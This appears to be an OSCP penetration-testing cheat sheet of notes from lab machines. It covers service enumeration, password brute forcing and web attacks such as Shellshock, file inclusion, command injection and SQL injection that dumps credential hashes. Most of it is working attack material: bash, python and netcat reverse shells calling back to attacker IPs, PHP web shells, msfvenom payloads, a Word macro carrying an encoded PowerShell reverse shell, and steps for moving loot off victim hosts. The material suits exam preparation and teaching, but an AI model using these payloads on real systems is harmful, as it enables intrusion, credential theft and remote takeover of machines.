# OSCP Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>

## Service Enumeration <img src="https://cdn-icons-png.flaticon.com/512/6989/6989458.png" width="40" height="40" />
### Network Enumeration
````
ping $IP #63 ttl = linux #127 ttl = windows
````
````
nmap -p- --min-rate 1000 $IP
nmap -p- --min-rate 1000 $IP -Pn #disables the ping command and only scans ports
````
````
nmap -p <ports> -sV -sC -A $IP
````
````
nmap -sS -p- --min-rate=1000 10.11.1.229 -Pn #stealth scans
````
````
target/release/rustscan -a 10.11.1.252
````
### Script to automate Network Enumeration
````
#!/bin/bash

target="$1"
ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

echo "Running second nmap scan with open ports: $ports"

nmap -p "$ports" -sC -sV -A "$target"
````
### Port Enumeration
#### FTP port 21
##### Emumeration
````
ftp -A $IP
ftp $IP
anonymous:anonymous
put test.txt #check if it is reflected in a http port
````
###### Upload binaries
````
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe
````
##### Brute Force
````
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
````
##### Downloading files recursively
````
wget -r ftp://steph:billabong@10.1.1.68/
````
````
find / -name Settings.*  2>/dev/null #looking through the files
````

#### SSH port 22
##### Emumeration
##### Exploitation
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa bob@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'

nc -nvlp 443
````
````
hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
````
#### SMTP port 25
````
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25
````
````
nc -nv $IP 25
telnet $IP 25
EHLO ALL
VRFY <USER>
````
##### Exploits Found
SMTP PostFix Shellshock
````
https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@mail.local #VRFY both useradm and root exist
````
#### HTTP(S) port 80,443
##### FingerPrinting
````
whatweb -a 3 $IP
nikto -ask=no -h http://$IP 2>&1
````
##### Directory Busting
##### Dirb
````
dirb http://target.com
````
##### ffuf
````
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
````
###### gobuster
````
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html,htm
````
###### feroxbuster
````
feroxbuster -u http://<$IP> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -o 
````
##### Files of interest
````
Configuration files such as .ini, .config, and .conf files.
Application source code files such as .php, .aspx, .jsp, and .py files.
Log files such as .log, .txt, and .xml files.
Backup files such as .bak, .zip, and .tar.gz files.
Database files such as .mdb, .sqlite, .db, and .sql files.
````
##### CMS 
###### WP Scan
````
wpscan --url http://$IP/wp/
````
###### WP Brute Forcing
````
wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
````
###### Malicous Plugins
````
https://github.com/wetw0rk/malicious-wordpress-plugin
python3 wordpwn.py 192.168.119.140 443 Y

meterpreter > shell
Process 1098 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
````
###### Drupal scan
````
droopescan scan drupal -u http://10.11.1.50:80
````
##### Exploitation CVEs
````
CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution
````
````
CVE-2015-6518 https://www.exploit-db.com/exploits/24044 phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
````
````
CVE-XXXX-XXXX https://www.exploit-db.com/exploits/25971 Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
````
````
CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1.0  Remote File Inclusion Vulnerability
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
````
````
CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
````
#### POP3 port 110
##### Enumerate
In this situation we used another service on port 4555 and reset the password of ryuu to test in order to login into pop3 and grab credentials for ssh. SSH later triggered an exploit which caught us a restricted shell as user ryuu
````
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $IP
````
````
telnet $IP 110 #Connect to pop3
USER ryuu #Login as user
PASS test #Authorize as user
list #List every message
retr 1 #retrieve the first email
````
#### RPC port 111
##### Enumerate
````
nmap -sV -p 111 --script=rpcinfo $IP
````
#### MSRPC port 135,593
##### Enumeration
````
rpcdump.py 10.1.1.68 -p 135
````
#### SMB port 139,445
Port 139
NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139. (extracted from here)

Port 445
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
##### Enumeration
###### nmap
````
nmap --script smb-enum-shares.nse -p445 $IP
nmap –script smb-enum-users.nse -p445 $IP
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $IP
nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $IP
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP
````
###### OS Discovery
````
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery $IP
````
smbmap
````
smbmap -H $IP
smbmap -u "user" -p "pass" -H $IP
smbmap -H $IP -u null
smbmap -H $IP -P 139 2>&1
smbmap -H $IP -P 445 2>&1
smbmap -u null -p "" -H $IP -P 139 -x "ipconfig /all" 2>&1
smbmap -u null -p "" -H $IP -P 445 -x "ipconfig /all" 2>&1
````
rpcclient
````
rpcclient -U "" -N $IP
````
enum4linux
````
enum4linux -a -M -l -d $IP 2>&1
enum4linux -a -u "" -p "" 192.168.180.71 && enum4linux -a -u "guest" -p "" $IP
````
crackmapexec
````
crackmapexec smb $IP
crackmapexec smb $IP -u "guest" -p ""
crackmapexec smb $IP --shares -u "guest" -p ""
crackmapexec smb $IP --shares -u "" -p ""
crackmapexec smb 10.1.1.68 -u 'guest' -p '' --users
````
smbclient
````
smbclient -U '%' -N \\\\<smb $IP>\\<share name>
prompt off
recurse on
mget *
````
````
smbclient -U null -N \\\\<smb $IP>\\<share name>
````
````
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
smbclient -U '%' -N \\\\$IP\\<share name> -m SMB2
smbclient -U '%' -N \\\\$IP\\<share name> -m SMB3
````
#### IMAP port 143/993
##### Enumeration
````
nmap -p 143 --script imap-ntlm-info $IP
````
#### MSSQL port 1433
##### Enumeration
````
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
````
##### Logging in
````
sqsh -S $IP -U sa -P CrimsonQuiltScalp193
````
##### Expliotation
````
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go
````
#### NFS port 2049
##### Enumeration
````
showmount $IP
showmount -e $IP
````
##### Mounting
````
sudo mount -o [options] -t nfs ip_address:share directory_to_mount
mkdir temp 
mount -t nfs -o vers=3 10.11.1.72:/home temp -o nolock
````
##### new user with new permissions
````
sudo groupadd -g 1014 <group name>
sudo groupadd -g 1014 1014
sudo useradd -u 1014 -g 1014 <user>
sudo useradd -u 1014 -g 1014 test
sudo passwd <user>
sudo passwd test
````
##### Changing permissions
The user cannot be logged in or active
````
sudo usermod -aG 1014 root
````
#### MYSQL port 3306
##### Enumeration
````
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.11.1.8 
````
#### RDP port 3389
##### Enumeration
````
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $IP -Pn
````
##### Password Spray
````
crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
````
#### Unkown Port
##### Enumeration
````
nc -nv $IP 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
````
#### Passwords Guessed
````
root:root
admin@xor.com:admin
admin:admin
````
## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />
### Shellshock
````
nikto -ask=no -h http://10.11.1.71:80 2>&1
OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability
````
````
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
http://10.11.1.71:80/cgi-bin/admin.cgi
````
### local File Inclusion
````
http://10.11.1.35/section.php?page=/etc/passwd
````
<img src="https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png" width="480" height="250" />

### Remote File Inclusion
````
http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
````

<img src="https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png" width="480" height="250" />

### Command Injection
#### DNS Querying Service
##### windows
For background the DNS Querying Service is running nslookup and then querying the output. The way we figured this out was by inputing our own IP and getting back an error that is similar to one that nslookup would produce. With this in mind we can add the && character to append another command to the query:
````
&& whoami
````

<img src="https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png" width="250" height="240" />

````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
&& certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
nc -nlvp 80
&& cmd /c C:\\Windows\\temp\\shell.exe
````
#### snmp manager
##### linux
````
For background on this box we had a snmp manager on port 4080 using whatweb i confirmed this was linux based. Off all of this I was able to login as admin:admin just on guessing the weak creds. When I got in I looked for random files and got Manager router tab which featured a section to ping the connectivity of the routers managed.
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.0.1
````
````
10.1.1.95:4080/ping_router.php?cmd=$myip
tcpdump -i tun0 icmp
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; wget http://192.168.119.140:8000/test.html
python3 -m http.server 8000
tcpdump -i tun0 icmp
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.140",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
````

### SQL Injection
Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
#### Research Repo MariaDB
<img src="https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png" width="250" height="240" />

````
admin ' OR 1=1 --
````
````
1' OR 1 = 1#
````
#### Oracle DB bypass login
````
admin ' OR 1=1 --
````
#### Oracle UNION DB dumping creds
````
https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
````
````
' 
Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
' OR 1=1 -- #query
Blog entry from Chris with title The Great Escape from 2017
Blog entry from Bob with title I Love Crypto from 2016
Blog entry from Alice with title Man-in-the-middle from 2018
Blog entry from Chris with title To Paris and Back from 2019
Blog entry from Maria with title Software Development Lifecycle from 2018
Blog entry from Eric with title Accounting is Fun from 2019
' union select 1,2,3,4,5,6-- #query
java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
 ' union select 1,2,3,4,5,6 from dual-- #Adjust for more or less columns
java.sql.SQLSyntaxErrorException: ORA-01789: query block has incorrect number of result columns
 ' union select 1,2,3 from dual-- #adjusted columns
java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype as corresponding expression ORA-01790: expression must have same datatype as corresponding expression 
 ' union select null,null,null from dual-- #query
Blog entry from null with title null from 0
' union select user,null,null from dual-- #query
Blog entry from WEB_APP with title null from 0
' union select table_name,null,null from all_tables-- #query
Blog entry from WEB_ADMINS with title null from 0
Blog entry from WEB_CONTENT with title null from 0
Blog entry from WEB_USERS with title null from 0
' union select column_name,null,null from all_tab_columns where table_name='WEB_ADMINS'-- #query
Blog entry from ADMIN_ID with title null from 0
Blog entry from ADMIN_NAME with title null from 0
Blog entry from PASSWORD with title null from 0
' union select ADMIN_NAME||PASSWORD,null,null from WEB_ADMINS-- #query
Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
````

#### MSSQL Error DB dumping creds
##### Reference Sheet

````
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
````

<img src="https://user-images.githubusercontent.com/127046919/228388326-934cba2a-2a41-42f2-981f-3c68cbaec7da.png" width="400" height="240" />

##### Example Case

````
' #Entered
Unclosed quotation mark after the character string '',')'. #response
````
###### Visualize the SQL statement being made

````
insert into dbo.tablename ('',''); 
#two statements Username and Email. Web Server says User added which indicates an insert statement
#we want to imagine what the query could potentially look like so we did a mock example above
insert into dbo.tablename (''',); #this would be created as an example of the error message above
````
##### Adjusting our initial Payload

````
insert into dbo.tablename ('1 AND 1=CONVERT(INT,@@version))--' ,''); #This is what is looks like
insert into dbo.tablename('',1 AND 1=CONVERT(INT,@@version))-- #Correct payload based on the above
',1 AND 1=CONVERT(INT,@@version))-- #Enumerate the DB
Server Error in '/Newsletter' Application.#Response
Incorrect syntax near the keyword 'AND'. #Response
',CONVERT(INT,@@version))-- #Corrected Payoad to adjust for the error
````
##### Enumerating DB Names

````
', CONVERT(INT,db_name(1)))--
master
', CONVERT(INT,db_name(2)))--
tempdb
', CONVERT(INT,db_name(3)))--
model
', CONVERT(INT,db_name(4)))--
msdb
', CONVERT(INT,db_name(5)))--
newsletter
', CONVERT(INT,db_name(6)))--
archive
````
##### Enumerating Table Names

````
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
pmanager
````
##### Enumerating number of Columns in selected Table

````
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager')+CHAR(58)+CHAR(58))))--
3 entries
````
##### Enumerate Column Names

````
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
alogin

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
id

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
psw
````
##### Enumerating Data in Columns

````
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
3c744b99b8623362b466efb7203fd182

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 2 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
5b413fe170836079622f4131fe6efa2d

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 3 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
7de6b6f0afadd89c3ed558da43930181

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
cb2d5be3c78be06d47b697468ad3b33b
````
### SSRF
SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.

<img src="https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png" width="250" height="240" />

````
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.146.172 - - [09/Mar/2023 16:39:17] code 404, message File not found
192.168.146.172 - - [09/Mar/2023 16:39:17] "GET /test.html HTTP/1.1" 404 -
````
````
http://192.168.119.146/test.html
http://192.168.119.146/test.hta
````
## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" />
### Windows rce techniques
````
locate nc.exe
smbserver.py -smb2support Share .
nc -nlvp 80
cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
````
````
cp /usr/share/webshells/asp/cmd-asp-5.1.asp . #IIS 5
ftp> put cmd-asp-5.1.asp
````
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
cmd /c C:\\Windows\\temp\\shell.exe
C:\inetpub\wwwroot\shell.exe #Path to run in cmd.aspx, click Run
````
````
cp /usr/share/webshells/aspx/cmdasp.aspx .
cp /usr/share/windows-binaries/nc.exe .
ftp> put cmdasp.aspx
smbserver.py -smb2support Share .
http://<target $IP>:<port>/cmdasp.aspx
nc -nlvp <port on your kali>
cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $IP> <your nc port>
````
### HTA Attack in Action
We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
````
msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
````
### Exploiting Microsoft Office
When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications
#### MSFVENOM
````
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
````
#### Minitrue
````
https://github.com/X0RW3LL/Minitrue
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
````
#### Microsoft Word Macro
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
````
Create the .doc file 
````
````
Use the base64 powershell code from revshells.com
````
````
Used this code to inline macro(Paste the code from revshells in str variable) :

str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA3ADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
````
````
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
````
### Linux rce techniques
````
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
python3 -m http.server
nc -nlvp 443
<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
````
````
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
shell.php&cmd=
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
````
````
 &cmd=whoami or ?cmd=whoami
<?php shell_exec($_GET["cmd"]);?>
<?php system($_GET["cmd"]);?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
````
````
cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
````
#### Chaining exploits
##### LFI to RFE
````
````
### Hashing & Cracking
#### Wordlists that worked
````
/usr/share/wordlists/rockyou.txt
/usr/share/wfuzz/wordlist/others/common_pass.txt
````
#### Enumeration
````
hashid <paste your hash here>
````
````
https://hashcat.net/wiki/doku.php?id=example_hashes
````
#### Cracking hashes
````
https://crackstation.net/
````
````
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
##### Md5
````
hashcat -m 0 -a 0 -o hashout eric.hash /home/jerm/rockyou.txt #if the original doesnt work use this
````
##### Cracking with Johntheripper
````
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
````
##### Crakcing with hydra
###### ssh
````
hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ssh
hydra -l megan -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
````
#### Cracking Zip files
````
unzip <file>
unzip bank-account.zip 
Archive:  bank-account.zip
[bank-account.zip] bank-account.xls password: 
````
````
zip2john file.zip zip.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip.txt
````
### Logging in/Changing users
#### rdp
````
rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d OFFSEC
xfreerdp /v:10.1.1.89 /u:xavier /pth:5e22b03be22022754bf0975251e1e7ac
````
## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />

## MSFVENOM
### MSFVENOM Cheatsheet
````
https://github.com/frizb/MSF-Venom-Cheatsheet
````
### Linux 64 bit PHP
````
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf > shell.php
````
### Windows 64 bit
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=<port you designated> -f exe -o ~/shell.exe
````
### Windows 64 bit apache tomcat
````
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=80 -f raw > shell.jsp
````
### Windows 64 bit aspx
````
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -o shell64.aspx
````
### Apache Tomcat War file
````
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
````
### Javascript shellcode
````
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le -o shellcode
````
## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
### SMB Linux to Windows
````
smbserver.py -smb2support Share .
cmd.exe /c //<your kali IP>/Share/<file name you want>
````
````
/usr/local/bin/smbserver.py -username df -password df share . -smb2support
net use \\<your kali IP>\share /u:df df
copy \\<your kali IP>\share\<file wanted>
````
````
smbserver.py -smb2support Share .
net use \\<your kali IP>\share
copy \\<your kali IP>\share\whoami.exe
````
### Windows http server Linux to Windows
````
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
````
### SMB Server Bi-directional
````
smbserver.py -smb2support Share .
mkdir loot #transfering loot to this folder
net use * \\192.168.119.183\share
copy Z:\<file you want from kali>
copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
````

### PHP Script Windows to Linux
````
cat upload.php
chmod +x upload.php
````
````
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
````
````
sudo mkdir /var/www/uploads
````
````
mv upload.php /var/www/uploads
````
````
service apache2 start
ps -ef | grep apache
`````
````
powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
````
````
service apache2 stop
````

## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />
### Use this guide first
````
https://sirensecurity.io/blog/linux-privilege-escalation-resources/
````
### Finding Writable Directories
````
find / -xdev -type d -perm -0002 -ls 2> /dev/null
